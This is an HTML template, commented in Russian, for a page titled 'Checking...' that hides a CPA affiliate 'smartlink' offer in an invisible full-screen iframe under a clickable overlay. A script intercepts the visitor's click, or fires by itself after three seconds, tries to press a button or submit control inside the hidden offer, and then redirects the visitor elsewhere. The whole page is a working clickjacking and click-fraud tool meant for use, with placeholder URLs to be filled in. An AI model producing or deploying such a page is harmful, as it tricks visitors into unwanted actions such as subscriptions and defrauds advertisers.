<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Checking...</title>
  <meta name="referrer" content="no-referrer">
  <style>
    body, html {
      margin: 0;
      padding: 0;
      overflow: hidden;
      background: #fff;
    }
    iframe {
      width: 100vw;
      height: 100vh;
      border: none;
      opacity: 0;
      position: absolute;
      top: 0;
      left: 0;
      z-index: 1;
    }
    .overlay {
      width: 100vw;
      height: 100vh;
      position: absolute;
      top: 0;
      left: 0;
      z-index: 2;
      cursor: pointer;
    }
  </style>
</head>
<body>

<!-- Смартлинк CPA сети -->
<iframe id="cpaFrame" src="https://your-smartlink-here.com/offer123"></iframe>

<!-- Перехватываем клик и прокидываем в iframe -->
<div class="overlay" onclick="triggerClick()"></div>

<script>
  function triggerClick() {
    try {
      const iframe = document.getElementById('cpaFrame').contentWindow.document;
      // Эмулируем кнопку подтверждения или действия
      iframe.querySelector('button, .btn, input[type=submit]').click();
    } catch(e) {
      console.log('Auto-click error (sandboxed or blocked)');
    }

    // Перекидываем на нужную страницу после клика
    setTimeout(() => {
      window.location.href = "https://yoursite.com/continue";
    }, 1000);
  }

  // Альтернативно, можно сработать автоматически:
  setTimeout(() => {
    triggerClick();
  }, 3000);
</script>

</body>
</html>
